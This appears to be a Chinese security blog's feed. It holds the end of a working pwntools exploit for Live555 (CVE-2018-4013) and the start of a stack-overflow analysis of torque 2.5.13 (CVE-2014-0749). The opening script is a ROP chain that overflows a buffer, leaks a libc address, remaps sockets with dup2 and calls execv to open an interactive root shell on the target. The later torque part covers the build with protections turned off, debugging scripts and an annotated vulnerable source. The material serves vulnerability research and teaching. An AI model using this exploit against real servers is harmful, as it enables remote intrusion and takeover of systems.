</span>    <span class="n">header</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\r\n\r\n</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">header</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">:</span><span class="n">remote</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">raw</span> <span class="o">=</span> <span class="nf">genHeader</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span>

<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">usage: python cve-2018-4013.py IP PORT</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">exit</span><span class="p">()</span>

<span class="n">rp</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>          <span class="c1"># 127.0.0.1:8000
</span>
<span class="c1"># 泄露strncmp地址
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x1c8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">strncmp_got</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_rbx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rcx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">send_plt</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">re_enter</span><span class="p">)</span>

<span class="nf">exploit</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">strncmp_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">rp</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">strncmp: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">strncmp_addr</span><span class="p">))</span>

<span class="n">libc_base</span> <span class="o">=</span> <span class="n">strncmp_addr</span> <span class="o">-</span> <span class="n">offset</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">libc base: </span><span class="sh">'</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

<span class="n">dup2_addr</span> <span class="o">=</span> <span class="n">dup2_off</span> <span class="o">+</span> <span class="n">libc_base</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">dup2: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">))</span>

<span class="n">execv_addr</span> <span class="o">=</span> <span class="n">execv_off</span> <span class="o">+</span> <span class="n">libc_base</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">execv: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">))</span>

<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">sh_off</span> <span class="o">+</span> <span class="n">libc_base</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">sh string: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">))</span>

<span class="c1"># 输入输出重定向
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x1c8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">re_enter</span><span class="p">)</span>

<span class="nf">exploit</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># 起一个shell
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x1c8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_rbx_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p64</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">)</span>

<span class="nf">exploit</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">rp</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

</code></pre></div></div>

<h1 id="重入位置怎么找">重入位置怎么找</h1>

<h2 id="环境准备的问题">环境准备的问题</h2>

<p>如果我们仅仅跳到doEventLoop函数的地址，那么肯定会崩溃，因为不满足两个条件：</p>

<ul>
  <li>rdi没有指向TaskScheduler对象的地址，实测发现rdi=1</li>
  <li>rsi不等于0，也就是watchVariable参数不为0，那么while(1)循环就继续不下去</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void BasicTaskScheduler0::doEventLoop<span class="o">(</span>char volatile<span class="k">*</span> watchVariable<span class="o">)</span> <span class="o">{</span>
  <span class="k">while</span> <span class="o">(</span>1<span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span>watchVariable <span class="o">!=</span> NULL <span class="o">&amp;&amp;</span> <span class="k">*</span>watchVariable <span class="o">!=</span> 0<span class="o">)</span> <span class="nb">break</span><span class="p">;</span>
    SingleStep<span class="o">()</span><span class="p">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>所以我们选择跳转到main函数调用doEventLoop的位置：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  
  <span class="n">TaskScheduler</span><span class="o">*</span> <span class="n">scheduler</span> <span class="o">=</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">createNew</span><span class="p">();</span>
  <span class="n">UsageEnvironment</span><span class="o">*</span> <span class="n">env</span> <span class="o">=</span> <span class="n">BasicUsageEnvironment</span><span class="o">::</span><span class="n">createNew</span><span class="p">(</span><span class="o">*</span><span class="n">scheduler</span><span class="p">);</span>
  <span class="p">......</span>
  <span class="n">env</span><span class="o">-&gt;</span><span class="n">taskScheduler</span><span class="p">().</span><span class="n">doEventLoop</span><span class="p">();</span> <span class="c1">//选择这里作为重入点</span>
<span class="p">}</span>
</code></pre></div></div>

<p>因为这一块完成了进入doEventLoop之前的环境初始化，满足了rdi和rsi寄存器的条件。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:00000000004052DF loc_4052DF:                             <span class="p">;</span> CODE XREF: main+5D5↓j
.text:00000000004052DF    mov   rax, cs:env    <span class="p">;</span> 解引用env对象
.text:00000000004052E6    xor   esi, esi       <span class="p">;</span> <span class="nb">env</span>+0x18的位置保存TaskScheduler对象指针
.text:00000000004052E8    mov   rdi, <span class="o">[</span>rax+18h] <span class="p">;</span> fScheduler对象地址作为第一个参数, this
.text:00000000004052EC    mov   rax, <span class="o">[</span>rdi]     <span class="p">;</span> 对象的第一个8字节保存的函数虚表地址
.text:00000000004052EF    call  qword ptr <span class="o">[</span>rax+38h] <span class="p">;</span> 虚表中index为7的槽位是doEventLoop函数指针
</code></pre></div></div>

<h2 id="寄存器对齐问题">寄存器对齐问题</h2>

<p>有些函数在中间一些步骤要确保rsp寄存器16字节对齐，否则会报段错误。</p>

<p>这个要根据具体的情况调试确定在重入之前rsp是8字节对齐还是16字节对齐。</p>

<p>在<a href="https://www.notion.so/torque-2-5-13-1cf3f4b7819d8064a26ee66740a68cfa?pvs=21">torque栈溢出漏洞分析</a>过程中发现了这个问题，因为rsp没有16字节对齐而导致snprintf函数段错误</p>

<p>总结一些重入点的选择方法：</p>

<ul>
  <li>要选择函数实际调用的位置作为重入点，而非函数定义的位置；</li>
  <li>在调用路径上选择重入点，尽量选择不带参数的函数，因为一旦带了参数就涉及到更加复杂的参数问题。不带参数的函数说明用的都是全局变量，栈溢出不会破坏全局变量；</li>
</ul>]]></content><author><name></name></author><category term="userspace" /><summary type="html"><![CDATA[Live555 是一个开源的、跨平台的 C++ 库，主要用于实现 RTSP/RTP/RTCP 等流媒体协议的推流（Server）和拉流（Client）功能。它支持多种音视频格式（如 H.264、H.265、MP3、AAC 等），常用于 IP 摄像头、视频监控、直播等场景。]]></summary></entry><entry><title type="html">torque-2.5.13栈溢出分析</title><link href="http://localhost:4000/userspace/2025/04/14/torque-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90.html" rel="alternate" type="text/html" title="torque-2.5.13栈溢出分析" /><published>2025-04-14T13:27:38+08:00</published><updated>2025-04-14T13:27:38+08:00</updated><id>http://localhost:4000/userspace/2025/04/14/torque-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/userspace/2025/04/14/torque-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90.html"><![CDATA[<p>漏洞位于pbs_server组件的tcp_gets函数。该函数从socket句柄读取TCP载荷，将获取的数据复制到栈上的时候没有进行数据检查造成栈溢出。
攻击者可以获取远程root shell</p>

<h1 id="漏洞信息">漏洞信息</h1>

<p>漏洞编号：<a href="https://nvd.nist.gov/vuln/detail/CVE-2014-0749">cve-2014-0749</a>， <a href="https://www.exploit-db.com/exploits/33554">EDB-33554</a></p>

<p>简介：漏洞位于pbs_server组件的tcp_gets函数。该函数从socket句柄读取TCP载荷，将获取的数据复制到栈上的时候没有进行数据检查造成栈溢出。</p>

<p>影响范围：2.5 ~ 2.5.13</p>

<p>效果：攻击者可以获取远程root shell</p>

<p>内存控制能力：</p>

<ul>
  <li>没有NULL截断，可随意写入</li>
  <li>栈上面的内容可控，无添加</li>
  <li>溢出长度可控</li>
  <li>没有内容过滤</li>
</ul>

<h1 id="环境搭建">环境搭建</h1>

<h2 id="torque软件介绍">torque软件介绍</h2>

<p>torque是分布式计算管理软件，pbs_server接收来自用户的作业请求，把作业请求根据计算节点的负载情况进行分配，下发到计算节点运行。</p>

<p>pbs_server负责监控每个计算节点的工作状态，适当时候进行作业调度。</p>

<p>漏洞发生在pbs_server接收用户的作业请求的时候，对用户的网络输入没有做长度检查，直接复制到栈上面导致的栈溢出漏洞。</p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84.jpg" alt="torque-软件架构.jpg" /></p>

<h2 id="torque的编译与使用">torque的编译与使用</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd </span>torque-2.5.13

<span class="c"># 关闭保护，添加调试符号 #</span>
<span class="nv">$ </span>./configure <span class="nv">CFLAGS</span><span class="o">=</span><span class="s2">"-fno-stack-protector -z execstack -no-pie -z norelro -g"</span>
<span class="nv">$ </span>make
<span class="nv">$ </span><span class="nb">sudo </span>make <span class="nb">install</span>

<span class="c"># 默认配置，执行torque.setup脚本，参数是普通用户的用户名 #</span>
<span class="nv">$ </span><span class="nb">sudo</span> ./torque.setup <span class="nb">test</span> 

<span class="c"># 拷贝启动脚本到/etc/init.d目录</span>
<span class="nv">$ </span><span class="nb">sudo cp </span>contrib/init.d/debian.pbs_server /etc/init.d/pbs_server
<span class="nv">$ </span><span class="nb">sudo </span>update-rc.d pbs_server defaults

<span class="c"># 启动pbs_server服务</span>
<span class="nv">$ </span><span class="nb">sudo</span> /etc/init.d/pbs_server restart
</code></pre></div></div>

<h2 id="实验环境搭建">实验环境搭建</h2>

<h3 id="看门狗编写">看门狗编写</h3>

<p>调试过程中pbs_server会被反复打崩，每次崩溃后需要自动重启。</p>

<p>看门狗的功能是每隔1秒检查一下pbs_server服务的15001端口是否开放，如检测不到15001端口说明服务崩溃，重启pbs_server服务。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="c"># 看门狗，监控pbs_server服务，确保挂掉后能够重启 </span>
<span class="c"># 以sudo权限执行脚本</span>
check_root<span class="o">(){</span>
    <span class="nb">cat</span> /etc/shadow <span class="o">&gt;</span> /dev/null 2&gt;&amp;1
    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-ne</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"please run as root privilege"</span>
        <span class="k">return </span>127
    <span class="k">else
        return </span>0
    <span class="k">fi</span>
<span class="o">}</span>

check_port<span class="o">(){</span>
    netstat <span class="nt">-ltnp</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">":15001"</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1
    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
        return </span>0        <span class="c"># 15001端口开放</span>
    <span class="k">else
        return </span>1        <span class="c"># 15001端口关闭</span>
    <span class="k">fi</span>
<span class="o">}</span>

<span class="c"># 重启pbs_server服务</span>
restart_pbs_server<span class="o">(){</span>
    <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2">: 15001 shutdown, restarting pbs_server ..."</span>
    /etc/init.d/pbs_server restart
    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2">: pbs_server restart success! "</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2">: error pbs_server restart failed! "</span>
    <span class="k">fi</span>
<span class="o">}</span>

<span class="c"># 主循环，每隔1秒检查一次</span>
<span class="k">if</span> <span class="o">!</span> check_root<span class="p">;</span> <span class="k">then 
    </span><span class="nb">exit </span>1
<span class="k">fi

while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
    if</span> <span class="o">!</span> check_port<span class="p">;</span> <span class="k">then
        </span>restart_pbs_server
    <span class="k">fi
    </span><span class="nb">sleep </span>1
<span class="k">done</span>
</code></pre></div></div>

<h3 id="pwndbg启动脚本编写">pwndbg启动脚本编写</h3>

<p>在服务端需要用pwndbg附加进程的方式对pbs_server进行调试</p>

<p>提取pbs_server的进程号，再使用-p参数attach上去调试。</p>

<p>需要注意的是容器启动参数需要 –cap-add=SYS_PTRACE 权限，否则不能attach进程。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>

<span class="nv">pid</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-ef</span> | <span class="nb">grep</span> <span class="nt">-w</span> <span class="s2">"pbs_server"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
<span class="nb">sudo </span>pwndbg <span class="nt">-p</span> <span class="nv">$pid</span> <span class="nt">--symbols</span><span class="o">=</span><span class="s2">"bin/pbs_server"</span>
</code></pre></div></div>

<h1 id="漏洞分析">漏洞分析</h1>

<h2 id="漏洞函数定位">漏洞函数定位</h2>

<p>根据漏洞公告提供的栈回溯信息：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c">#0 0x0000003dd4a88b9a in memcpy () from /lib64/libc.so.6</span>
<span class="c">#1 0x00007fa0008cb65b in tcp_gets (fd=11, str=0x7fff8dfce741 '3' &lt;repeats 26 times&gt;,</span>
<span class="s2">"Ab1Ab2Ab3"</span>,
<span class="nv">ct</span><span class="o">=</span>332<span class="o">)</span> at ../Libifl/tcp_dis.c:567
<span class="c">#2 0x00007fa0008be994 in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,</span>
<span class="nv">count</span><span class="o">=</span>333<span class="o">)</span>
at ../Libdis/disrsi_.c:187
<span class="c">#3 0x00007fa0008bea1a in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,</span>
<span class="nv">count</span><span class="o">=</span>&lt;value optimized out&gt;<span class="o">)</span> at ../Libdis/disrsi_.c:216
<span class="c">#4 0x00007fa0008bea1a in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,</span>
<span class="nv">count</span><span class="o">=</span>&lt;value optimized out&gt;<span class="o">)</span> at ../Libdis/disrsi_.c:216
<span class="c">#5 0x00007fa0008bdfab in disrfst (stream=11, achars=33, value=0x27f0b58 "")</span>
at ../Libdis/disrfst.c:125
<span class="c">#6 0x00007fa0008c13ba in decode_DIS_ReqHdr (sock=11, preq=0x27f0b20,</span>
<span class="nv">proto_type</span><span class="o">=</span>0x7fff8dfce9dc,
<span class="nv">proto_ver</span><span class="o">=</span>0x7fff8dfce9d8<span class="o">)</span> at ../Libifl/dec_ReqHdr.c:141
<span class="c">#7 0x0000000000409ba1 in dis_request_read (sfds=11, request=0x27f0b20) at dis_read.c:137</span>
<span class="c">#8 0x000000000041cb6e in process_request (sfds=11) at process_request.c:355</span>
<span class="c">#9 0x00007fa0008d4899 in wait_request (waittime=&lt;value optimized out&gt;, SState=0x72c258)</span>
at ../Libnet/net_server.c:508
<span class="c">#10 0x000000000041afeb in main_loop () at pbsd_main.c:1203</span>
<span class="c">#11 0x000000000041bd15 in main (argc=&lt;value optimized out&gt;, argv=&lt;value optimized out&gt;)</span>
at pbsd_main.c:1760

</code></pre></div></div>

<p>可以整理出如下函数调用过程：</p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque.jpg" alt="torque.jpg" /></p>

<p>画框的部分是递归，递归层数根据攻击者的输入而定。</p>

<h2 id="漏洞原理">漏洞原理</h2>

<p>从socket句柄获取数据是从disrsi_函数开始的：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">disrfst</span><span class="p">(</span><span class="kt">int</span> <span class="n">stream</span><span class="p">,</span> <span class="kt">size_t</span>  <span class="n">achars</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">value</span><span class="p">){</span>
  <span class="kt">int</span>  <span class="n">locret</span><span class="p">;</span>
  <span class="kt">int</span>  <span class="n">negate</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="n">count</span><span class="p">;</span>
  <span class="n">locret</span> <span class="o">=</span> <span class="n">disrsi_</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">negate</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">count</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</code></pre></div></div>

<p>用户的输入格式如下，使用ASCII编码的字符串来表示十进制数，前一级指示后一级数字的长度，递归调用disrsi_函数来解析。</p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-payload.jpg" alt="torque-payload.jpg" /></p>

<p>disrsi_ 函数的作用是递归解析用户输入，第一次调用 disrsi_ 的 count=1，表示读取第一个字节，就是上图的“3”，表示下一级的长度为3个字符，解析出来3传递给下一次递归调用的 count 参数；</p>

<p>第二次递归调用 disrsi_ 的 count 等于上一次解析出来的3，这次会读取“123”并转化成unsigned 传递给下一次递归的 count 参数；</p>

<p>第三次递归调用 disrsi_ 的 count 等于123，作为下一次递归调用的 count 参数。</p>

<p>第四次递归调用 disrsi_ 会认为后面的十进制数字的长度是123个字符，因此会从socket句柄读取123字节存放到 scratch 数组中，而该数组的长度为65字节，造成了溢出。</p>

<p>每一次递归都会重新分配 disrsi_ 函数栈帧，因此覆盖的返回地址是回到上一级 disrsi_ 函数的地址。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">disrsi_</span><span class="p">(</span><span class="kt">int</span> <span class="n">stream</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">negate</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="kt">unsigned</span>  <span class="n">count</span><span class="p">){</span>
  <span class="kt">int</span>  <span class="n">c</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="n">locval</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="n">ndigs</span><span class="p">;</span>
  <span class="kt">char</span>  <span class="o">*</span><span class="n">cp</span><span class="p">;</span>
  <span class="kt">char</span>  <span class="n">scratch</span><span class="p">[</span><span class="n">DIS_BUFSIZ</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>     <span class="c1">//被溢出的对象, 长度为65</span>

  <span class="n">memset</span><span class="p">(</span><span class="n">scratch</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">DIS_BUFSIZ</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dis_umaxd</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">disiui_</span><span class="p">();</span>   <span class="c1">//计算dis_umaxd的值</span>
    
	<span class="c1">// 函数指针调用，实际调用tcp_getc函数, 获取1字节tcp数据</span>
	<span class="c1">// 判断 正负号 以及用户输入是不是一个合法的十进制字符串</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">dis_getc</span><span class="p">)(</span><span class="n">stream</span><span class="p">))</span> 
  <span class="p">{</span>
    <span class="k">case</span> <span class="sc">'-'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'+'</span><span class="p">:</span>
      <span class="o">*</span><span class="n">negate</span> <span class="o">=</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'-'</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">dis_gets</span><span class="p">)(</span><span class="n">stream</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="n">count</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">count</span><span class="p">){</span> <span class="c1">//</span>
        <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOD</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="n">dis_umaxd</span><span class="p">){</span>    <span class="c1">// 经过调试，dis_umaxd=10</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">dis_umaxd</span><span class="p">)</span>    <span class="c1">// 该变量的意义是unsigned int的最大值为0xffff_ffff</span>
          <span class="k">goto</span> <span class="n">overflow</span><span class="p">;</span>          <span class="c1">// 化为十进制就是4294967295，长度为10个字符</span>
                                  <span class="c1">// 意义就是unsigned int的最大数需要用10个数字来表示十进制值</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">scratch</span><span class="p">,</span> <span class="n">dis_umax</span><span class="p">,</span> <span class="n">dis_umaxd</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
          <span class="k">goto</span> <span class="n">overflow</span><span class="p">;</span>
      <span class="p">}</span>                           <span class="c1">// 以上处理用户输入超过unsigned int表示范围的情况</span>
      <span class="n">cp</span> <span class="o">=</span> <span class="n">scratch</span><span class="p">;</span>
      <span class="n">locval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

      <span class="k">do</span>
        <span class="p">{</span>
        <span class="k">if</span> <span class="p">(((</span><span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="n">cp</span><span class="o">++</span><span class="p">)</span> <span class="o">&lt;</span> <span class="sc">'0'</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;</span> <span class="sc">'9'</span><span class="p">))</span>
          <span class="p">{</span>
          <span class="k">return</span><span class="p">(</span><span class="n">DIS_NONDIGIT</span><span class="p">);</span>
          <span class="p">}</span>

        <span class="n">locval</span> <span class="o">=</span> <span class="mi">10</span> <span class="o">*</span> <span class="n">locval</span> <span class="o">+</span> <span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">count</span><span class="p">);</span>
      <span class="o">*</span><span class="n">value</span> <span class="o">=</span> <span class="n">locval</span><span class="p">;</span>
      <span class="k">return</span> <span class="p">(</span><span class="n">DIS_SUCCESS</span><span class="p">);</span>

      <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="sc">'0'</span><span class="p">:</span>     <span class="c1">//第一个数字不能是0</span>
      <span class="k">return</span> <span class="p">(</span><span class="n">DIS_LEADZRO</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="sc">'1'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'4'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'5'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'6'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'7'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'8'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'9'</span><span class="p">:</span>
      <span class="n">ndigs</span> <span class="o">=</span> <span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>    <span class="c1">//计算十进制字符串的长度</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">){</span>
      <span class="c1">//tcp_gets</span>
